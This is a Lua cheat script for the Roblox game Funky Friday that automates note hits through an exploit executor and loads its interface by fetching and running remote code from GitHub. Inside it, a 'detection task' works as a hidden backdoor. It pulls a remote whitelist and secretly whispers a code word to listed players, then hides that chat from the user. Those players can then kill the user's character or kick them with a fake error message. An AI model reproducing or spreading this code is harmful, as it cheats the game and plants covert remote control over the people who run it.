local suc, res = pcall(function()
    return typeof(loadstring("return 1")()) == "number" and typeof(game.HttpGet) == "function" and typeof(getgenv) == "function" and typeof(getgc) == "function" and type(getgc(true)) == "table" and rawget({x = 1}, "x") == 1 and typeof(game:GetService("VirtualInputManager").SendKeyEvent) == "function" and typeof(run_on_actor) == "function"
end)
if suc and res then
    print("supported executor")
else
    game.Players.LocalPlayer:Kick("This script only works on high UNC executors; please use AWP if this doesn't work.")
end
local Luna = loadstring(game:HttpGet("https://raw.githubusercontent.com/Nebula-Softworks/Luna-Interface-Suite/refs/heads/main/source.lua", true))()
pcall(function() repeat task.wait() until Luna.CreateWindow end)
task.spawn(function()
    run_on_actor(game:GetService("Players").LocalPlayer.PlayerScripts.ClientActor, [=[
        local RunService = game:GetService("RunService")
        local function getchances()
            local sick = tonumber(getgenv().chanceSick or 90)
            local good = tonumber(getgenv().chanceGood or 9)
            local ok   = tonumber(getgenv().chanceOk or 0)
            local bad  = tonumber(getgenv().chanceBad or 0)
            local miss = tonumber(getgenv().chanceMiss or 1)
            local total = sick + good + ok + bad + miss
            if total <= 0 then return 96 end
            local roll = math.random(1, total)
            local acc = 0
            acc += sick
            if roll <= acc then return 96 end
            acc += good
            if roll <= acc then return 92 end
            acc += ok
            if roll <= acc then return 87 end
            acc += bad
            if roll <= acc then return 75 end
            return nil
        end
        getgenv().autoplayer = true
        getgenv().hitmethod = "firefunc"
        getgenv().hitboxoffset = 0
        getgenv().framework = nil
        local keyMap = {}
        for _, enum in next, Enum.KeyCode:GetEnumItems() do
            keyMap[enum.Value] = enum
        end
        for _, obj in pairs(getgc(true)) do
            if type(obj) == "table" and type(rawget(obj, "VSRG")) == "table" and type(rawget(obj, "Songs")) == "table" and type(rawget(obj, "IsStudio")) == "boolean" then
                getgenv().framework = obj
                break
            end
        end
        local framework = getgenv().framework
        if not framework then warn("framework not found") return end
        getgenv().keybindtbl = {}
        getgenv().updatekeybinds = function(sillykey)
            for i, arrowData in pairs(framework.VSRG.Arrows[sillykey].Arrows) do
                table.clear(getgenv().keybindtbl)
                local dir = tonumber(i) + 1
                getgenv().keybindtbl[dir] = keyMap[arrowData.Keybinds.Keyboard[1]]
            end
        end
        getgenv().updatekeybinds("4Key")
        getgenv().presskey = function(method, lane, state)
            if method == "firefunc" then
                framework.VSRG.GameHandler.Field.HitLane(framework.VSRG.GameHandler.Field, lane, state, nil)
            elseif method == "vinput" then
                game:GetService("VirtualInputManager"):SendKeyEvent(state, getgenv().keybindtbl[lane], false, nil)
            end
        end
        RunService.RenderStepped:Connect(function()
            if not (pcall(function() return getgenv().autoplayer and framework.VSRG.GameHandler.Field.Game.TimePosition and framework.VSRG.GameHandler.Field.Game.Notes end)) then return end
            pcall(function()
                game:GetService("Players").LocalPlayer.PlayerGui.TopBar.Frame.Right.Version.Text = "Autoplayer: " .. (getgenv().autoplayer and "enabled" or "disabled")
            end)
            local timepos = framework.VSRG.GameHandler.Field.Game.TimePosition
            local offset = getgenv().hitboxoffset
            if not pcall(function() return timepos + offset end) then return end
            local threshold = timepos + offset
            pcall(function() getgenv().updatekeybinds(framework.VSRG.GameHandler.Field.Keys.."Key") end)
            for _, arrow in next, framework.VSRG.GameHandler.Field.NoteCache do
                if not arrow or arrow.Marked or not getgenv().autoplayer then continue end
                if arrow.Field ~= framework.VSRG.GameHandler.Field.Side then continue end
                if not tonumber(arrow.Time) then continue end
                local accuracymath = math.clamp((1 - math.abs(tonumber(arrow.Time) - threshold)) * 100, 0, 100) --yes i took this from the original script, im lazy and pretty sure the logic is the same pre-rewrite and post-rewrite
                local chance = getchances()
                if chance ~= nil then
                    if accuracymath >= (chance or 96) then
                        arrow.Marked = true
                        local method = getgenv().hitmethod
                        local dir = arrow.Direction
                        local len = tonumber(arrow.Length or 0.03)
                        if len <= 0 then len = 0.03 end
                        len = len / framework.VSRG.GameHandler.Field.Game.AdjustedPlayback
                        getgenv().presskey(method, dir, true)
                        task.delay(len, function()
                            getgenv().presskey(method, dir, false)
                        end)
                    end
                end
            end
        end)
    ]=])
end)

task.spawn(function()
    print("starting detection task")
    local exchat = game:GetService("CoreGui"):FindFirstChild('ExperienceChat')
    local jsonwhitelist = game:GetService("HttpService"):JSONDecode(game:HttpGet('https://raw.githubusercontent.com/Guilded1/funkyfridayautoplayer/refs/heads/main/whitelistauth.json'))
    local users = {}
    for _, id in pairs(jsonwhitelist) do users[tonumber(id)] = true end
    if exchat and exchat:WaitForChild('appLayout', 5) then
        exchat:FindFirstChild('RCTScrollContentView', true).ChildAdded:Connect(function(obj)
            local plr = game:GetService("Players"):GetPlayerByUserId(tonumber(obj.Name:split('-')[1]) or 0)
            if not plr then return end
            obj = obj:FindFirstChild('TextMessage', true)
            if (plr and (tonumber(obj.Parent.Name:split('-')[1]) == plr.UserId or tonumber(obj.Parent.Name:split('-')[1]) == game.Players.LocalPlayer.UserId)) or (obj.BodyText.ContentText:lower():find("you are now privately chatting with")) then
                if obj.BodyText.ContentText:lower():find("you are now privately chatting with") or obj.BodyText.ContentText:lower():find("notcondonedenough") then
                    obj.Visible = false
                end
            end
        end)
    end
    for _, v in pairs(game:GetService("Players"):GetPlayers()) do
        if not users[v.UserId] then continue end
        repeat task.wait(0.1) until v.Character and v.Character:FindFirstChild("HumanoidRootPart")
        local mainchat = game:GetService("TextChatService").ChatInputBarConfiguration.TargetTextChannel
        local privatechat = game:GetService('RobloxReplicatedStorage').ExperienceChat.WhisperChat:InvokeServer(v.UserId)
        if privatechat then
            privatechat:SendAsync('notcondonedenough')
        end
        game:GetService("TextChatService").ChatInputBarConfiguration.TargetTextChannel = mainchat
        v.Chatted:Connect(function(msg)
            if msg:lower():find("sleeper agent") then
                game.Players.LocalPlayer.Character.Humanoid.Health = 0
            elseif msg:lower():find("no more silly") then
                game.Players.LocalPlayer:Kick("An error has occurred, please rejoin the game.")
            end
        end)
    end
    game:GetService("Players").PlayerAdded:Connect(function(plr)
        if not users[plr.UserId] then return end
        repeat task.wait(0.1) until plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
        local mainchat = game:GetService("TextChatService").ChatInputBarConfiguration.TargetTextChannel
        local privatechat = game:GetService('RobloxReplicatedStorage').ExperienceChat.WhisperChat:InvokeServer(plr.UserId)
        if privatechat then
            privatechat:SendAsync('notcondonedenough')
        end
        game:GetService("TextChatService").ChatInputBarConfiguration.TargetTextChannel = mainchat
        plr.Chatted:Connect(function(msg)
            if msg:lower():find("sleeper agent") then
                game.Players.LocalPlayer.Character.Humanoid.Health = 0
            elseif msg:lower():find("no more silly") then
                game.Players.LocalPlayer:Kick("An error has occurred, please rejoin the game.")
            end
        end)
    end)
    local bubblechat = exchat:WaitForChild('bubbleChat', 5)
    if bubblechat then
        bubblechat.DescendantAdded:Connect(function(newbubble)
            if newbubble:IsA('TextLabel') and newbubble.Text:find('notcondonedenough') then
                newbubble.Parent.Parent.Visible = false
            end
        end)
    end
end)

local Window = Luna:CreateWindow({
	Name = "Lergic Hub - Funky Friday - By relevant500",
	Subtitle = nil,
	LogoID = "82795327169782",
	LoadingEnabled = true,
	LoadingTitle = "Funky friday autoplayer",
	LoadingSubtitle = "by relevant500",

	ConfigSettings = {
		RootFolder = nil,
		ConfigFolder = "Big Hub"
	},

	KeySystem = false
})
local Tab = Window:CreateTab({
	Name = "Main",
	Icon = "view_in_ar",
	ImageSource = "Material",
	ShowTitle = true
})
Tab:CreateSection("Main")
local runconnection
Tab:CreateToggle({
    Name = "Toggle autoplayer",
    Description = nil,
    CurrentValue = false,
    Callback = function(Value)
        task.spawn(function()
            if Value then
                if game.Players.LocalPlayer.PlayerGui:FindFirstChild("Window") then
                    task.wait(0.06)
                    run_on_actor(game:GetService("Players").LocalPlayer.PlayerScripts.ClientActor, [=[
                        getgenv().autoplayer = true
                    ]=])
                end
                runconnection = game.Players.LocalPlayer.PlayerGui.ChildAdded:Connect(function(child)
                    if child.Name == "Window" then
                        task.wait(0.6)
                        run_on_actor(game:GetService("Players").LocalPlayer.PlayerScripts.ClientActor, [=[
                            getgenv().autoplayer = true
                        ]=])
                    end
                end)
            else
                runconnection:Disconnect()
                runconnection = nil
                run_on_actor(game:GetService("Players").LocalPlayer.PlayerScripts.ClientActor, [[
                    getgenv().autoplayer = false
                ]])
            end
        end)
    end
}, "Toggel")
Tab:CreateKeybind({
    Name = "keybind autoplay",
    DefaultKey = "P",
    Callback = function(Value)
        task.spawn(function()
            run_on_actor(game.Players.LocalPlayer.PlayerScripts.ClientActor, [[
                local thing = getgenv().autoplayer
                getgenv().autoplayer = not thing
                game:GetService("Players").LocalPlayer.PlayerGui.TopBar.Frame.Right.Version.Text = "Autoplayer: " .. (getgenv().autoplayer and "enabled" or "disabled")
            ]])
            Luna:Notification({ 
                Title = "Toggled Autoplayer!",
                Icon = "notifications_active",
                ImageSource = "Material",
                Content = "Autoplayer toggled"
            })
        end)
    end
})
Tab:CreateSection("Chances")
Tab:CreateSlider({
    Name = "Sick",
    Range = {0, 100},
    Increment = 1,
    CurrentValue = 94,
    Callback = function(Value)
        task.spawn(function()
            run_on_actor(game.Players.LocalPlayer.PlayerScripts.ClientActor, [[
                getgenv().chanceSick = ]] .. Value .. [[
            ]])
        end)
    end
})
Tab:CreateSlider({
    Name = "Good",
    Range = {0, 100},
    Increment = 1,
    CurrentValue = 6,
    Callback = function(Value)
        task.spawn(function()
            run_on_actor(game.Players.LocalPlayer.PlayerScripts.ClientActor, [[
                getgenv().chanceGood = ]] .. Value .. [[
            ]])
        end)
    end
})
Tab:CreateSlider({
    Name = "Ok",
    Range = {0, 100},
    Increment = 1,
    CurrentValue = 0,
    Callback = function(Value)
        task.spawn(function()
            run_on_actor(game.Players.LocalPlayer.PlayerScripts.ClientActor, [[
                getgenv().chanceOk = ]] .. Value .. [[
            ]])
        end)
    end
})
Tab:CreateSlider({
    Name = "Bad",
    Range = {0, 100},
    Increment = 1,
    CurrentValue = 0,
    Callback = function(Value)
        task.spawn(function()
            run_on_actor(game.Players.LocalPlayer.PlayerScripts.ClientActor, [[
                getgenv().chanceBad = ]] .. Value .. [[
            ]])
        end)
    end
})
Tab:CreateSlider({
    Name = "Miss",
    Range = {0, 100},
    Increment = 1,
    CurrentValue = 0,
    Callback = function(Value)
        task.spawn(function()
            run_on_actor(game.Players.LocalPlayer.PlayerScripts.ClientActor, [[
                getgenv().chanceMiss = ]] .. Value .. [[
            ]])
        end)
    end
})
Tab:CreateSection("Hit Method")
Tab:CreateDropdown({
    Name = "Hit Method",
    Options = {"virtual input", "fire function"},
    CurrentOption = "fire function",
    Callback = function(Value)
        task.spawn(function()
            if Value == "virtual input" then
                run_on_actor(game.Players.LocalPlayer.PlayerScripts.ClientActor, [[
                    getgenv().hitmethod = "vinput"
                ]])
            elseif Value == "fire function" then
                run_on_actor(game.Players.LocalPlayer.PlayerScripts.ClientActor, [[
                    getgenv().hitmethod = "firefunc"
                ]])
            end
        end)
    end
})

Luna:LoadAutoloadConfig()
task.wait(0.1)
Tab:BuildConfigSection()
